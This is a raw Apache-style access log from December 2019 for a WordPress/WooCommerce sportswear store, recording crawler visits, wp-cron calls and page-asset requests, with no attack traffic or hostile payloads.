23.226.211.55 - - [15/Dec/2019:10:05:16 +0100] "GET / HTTP/1.1" 200 125585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" "wpfront-notification-bar-landingpage=1; APSERVER_ID=dd1f056bedc8f731148a5593dfacd38d9357bcded369ec434d0e5dba50f7f451"
104.222.43.46 - - [15/Dec/2019:10:05:24 +0100] "GET /wp-content/uploads/2019/05/cropped-favicon-nuevo-logo-amazinf-128px-32x32.png HTTP/1.1" 200 4392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" "-"
69.171.251.19 - - [15/Dec/2019:10:12:29 +0100] "GET /wp-content/uploads/2019/07/slider1.jpg HTTP/1.1" 206 247735 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
217.76.130.90 - - [15/Dec/2019:10:27:39 +0100] "POST /wp-cron.php?doing_wp_cron=1576402059.3122351169586181640625 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576402059.3122351169586181640625" "WordPress/5.2.5; https://amazingsportwear.com" "-"
69.171.251.40 - - [15/Dec/2019:10:27:37 +0100] "GET / HTTP/1.1" 200 125585 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
69.171.251.12 - - [15/Dec/2019:10:27:41 +0100] "GET /contacta-con-nosotros HTTP/1.1" 301 319 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
69.171.251.12 - - [15/Dec/2019:10:27:42 +0100] "GET /contacta-con-nosotros/ HTTP/1.1" 200 58216 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
217.76.130.90 - - [15/Dec/2019:10:38:58 +0100] "POST /wp-cron.php?doing_wp_cron=1576402738.1314580440521240234375 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576402738.1314580440521240234375" "WordPress/5.2.5; https://amazingsportwear.com" "-"
17.58.96.177 - - [15/Dec/2019:10:38:57 +0100] "GET /categoria-producto/accesorios/pulseras/ HTTP/1.1" 200 59537 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
217.76.130.90 - - [15/Dec/2019:10:40:57 +0100] "POST /wp-cron.php?doing_wp_cron=1576402857.7326099872589111328125 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576402857.7326099872589111328125" "WordPress/5.2.5; https://amazingsportwear.com" "-"
207.46.13.13 - - [15/Dec/2019:10:40:57 +0100] "GET /producto/camiseta-tecnica-nath-action/ HTTP/1.1" 200 109006 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:10:47:34 +0100] "POST /wp-cron.php?doing_wp_cron=1576403254.8328800201416015625000 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576403254.8328800201416015625000" "WordPress/5.2.5; https://amazingsportwear.com" "-"
17.58.96.177 - - [15/Dec/2019:10:47:33 +0100] "GET /categoria-producto/hombre/ HTTP/1.1" 200 76888 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
217.76.130.90 - - [15/Dec/2019:10:55:48 +0100] "POST /wp-cron.php?doing_wp_cron=1576403748.6170260906219482421875 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576403748.6170260906219482421875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
23.239.180.230 - - [15/Dec/2019:10:55:46 +0100] "GET / HTTP/1.1" 301 336 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" "-"
23.239.180.192 - - [15/Dec/2019:10:55:49 +0100] "GET / HTTP/1.1" 200 125550 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" "wpfront-notification-bar-landingpage=1; APSERVER_ID=a310a2b42eb27d5f48e7bbcb14edb10fa07a221ffca8288fe3d701b3384b8907"
104.222.33.191 - - [15/Dec/2019:10:55:55 +0100] "GET /wp-content/uploads/2019/05/cropped-favicon-nuevo-logo-amazinf-128px-32x32.png HTTP/1.1" 200 4392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0" "-"
217.76.130.90 - - [15/Dec/2019:11:03:33 +0100] "POST /wp-cron.php?doing_wp_cron=1576404213.9105250835418701171875 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576404213.9105250835418701171875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
207.46.13.162 - - [15/Dec/2019:11:03:33 +0100] "GET /producto/polo-tecnico-sol-palladium/ HTTP/1.1" 200 105804 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [15/Dec/2019:11:15:18 +0100] "POST /wp-cron.php?doing_wp_cron=1576404918.2064979076385498046875 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576404918.2064979076385498046875" "WordPress/5.2.5; https://amazingsportwear.com" "-"
17.58.96.177 - - [15/Dec/2019:11:15:16 +0100] "GET /categoria-producto/accesorios/ HTTP/1.1" 200 76137 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)" "-"
217.76.130.90 - - [15/Dec/2019:11:26:10 +0100] "POST /wp-cron.php?doing_wp_cron=1576405570.7065000534057617187500 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576405570.7065000534057617187500" "WordPress/5.2.5; https://amazingsportwear.com" "-"
66.249.80.48 - - [15/Dec/2019:11:26:09 +0100] "GET /producto/bandana-microfibra-tipo-buff/ HTTP/1.1" 200 92567 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/wpfront-notification-bar/js/wpfront-notification-bar.js?ver=1.7.1 HTTP/1.1" 200 5662 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/css/photoswipe/default-skin/default-skin.css?ver=3.6.4 HTTP/1.1" 200 15306 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/css/photoswipe/photoswipe.css?ver=3.6.4 HTTP/1.1" 200 7835 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/simple-social-icons/css/style.css?ver=3.0.1 HTTP/1.1" 200 4925 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/css/wdm-jquery-ui.css?ver=5.2.5 HTTP/1.1" 200 30364 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.70 HTTP/1.1" 200 13271 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/css/blocks/style.css?ver=3.6.4 HTTP/1.1" 200 10060 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=3.6.4 HTTP/1.1" 200 2983 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/cookie-law-info/public/js/cookie-law-info-public.js?ver=1.7.6 HTTP/1.1" 200 20439 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 13762 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/cookie-law-info/public/css/cookie-law-info-gdpr.css?ver=1.7.6 HTTP/1.1" 200 15808 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/flexslider/jquery.flexslider.min.js?ver=2.7.2 HTTP/1.1" 200 23232 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/photoswipe/photoswipe-ui-default.min.js?ver=4.1.1 HTTP/1.1" 200 10220 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/cookie-law-info/public/css/cookie-law-info-public.css?ver=1.7.6 HTTP/1.1" 200 6598 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/single-product.min.js?ver=3.6.4 HTTP/1.1" 200 6693 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/simple-social-icons/svgxuse.js?ver=1.1.21 HTTP/1.1" 200 12943 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/themes/shopper/assets/js/crm.js?ver=1561548510 HTTP/1.1" 200 4237 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/themes/shopper/assets/sass/woocommerce/woocommerce.css?ver=5.2.5 HTTP/1.1" 200 86897 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/css/dist/block-library/style.min.css?ver=5.2.5 HTTP/1.1" 200 33023 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/wpfront-notification-bar/jquery-plugins/jquery.c.js?ver=1.4.0 HTTP/1.1" 200 6800 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4 HTTP/1.1" 200 2187 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 200 100725 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/zoom/jquery.zoom.min.js?ver=1.7.21 HTTP/1.1" 200 2957 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/wpfront-notification-bar/css/wpfront-notification-bar.css?ver=1.7.1 HTTP/1.1" 200 7026 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/jquery.js?ver=1.12.4-wp HTTP/1.1" 200 100725 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/themes/shopper/assets/js/skip-link-focus-fix.js?ver=1.3.8 HTTP/1.1" 200 1023 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=3.6.4 HTTP/1.1" 200 3281 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/themes/shopper/assets/js/shopper.min.js?ver=1.3.8 HTTP/1.1" 200 5994 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/comment-reply.min.js?ver=5.2.5 HTTP/1.1" 200 2575 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/underscore.min.js?ver=1.8.3 HTTP/1.1" 200 16527 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/wp-embed.min.js?ver=5.2.5 HTTP/1.1" 200 1744 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/core.min.js?ver=1.11.4 HTTP/1.1" 200 4341 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/themes/shopper/style.css?ver=1.3.8 HTTP/1.1" 200 128678 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 HTTP/1.1" 200 7250 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4 HTTP/1.1" 200 3489 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart-variation.min.js?ver=3.6.4 HTTP/1.1" 200 13625 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/woocommerce/assets/js/photoswipe/photoswipe.min.js?ver=4.1.1 HTTP/1.1" 200 32276 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4 HTTP/1.1" 200 18798 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4 HTTP/1.1" 200 19277 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/button.min.js?ver=1.11.4 HTTP/1.1" 200 7578 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/position.min.js?ver=1.11.4 HTTP/1.1" 200 6869 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4 HTTP/1.1" 200 12482 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/js/wdm_jquery.validate.min.js?ver=5.2.5 HTTP/1.1" 200 21818 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/js/contact.js?ver=5.2.5 HTTP/1.1" 200 4681 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-includes/js/wp-emoji-release.min.js?ver=5.2.5 HTTP/1.1" 200 14183 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/uploads/2019/05/cropped-asw-white.png HTTP/1.1" 200 7500 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:12 +0100] "GET /wp-content/plugins/akismet/_inc/form.js?ver=4.1.2 HTTP/1.1" 200 1040 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.48 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/uploads/2019/05/asw-white-300x126.png HTTP/1.1" 200 12061 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=3.6.4 HTTP/1.1" 200 5176 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/themes/shopper/assets/js/woocommerce/header-cart.min.js?ver=1.3.8 HTTP/1.1" 200 4335 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.50 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/plugins/simple-social-icons/symbol-defs.svg HTTP/1.1" 200 19699 "https://amazingsportwear.com/producto/bandana-microfibra-tipo-buff/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
66.249.80.52 - - [15/Dec/2019:11:26:13 +0100] "GET /wp-content/plugins/wpfront-notification-bar/images/arrow_down.png HTTP/1.1" 200 2562 "https://amazingsportwear.com/wp-content/plugins/wpfront-notification-bar/css/wpfront-notification-bar.css?ver=1.7.1" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19" "-"
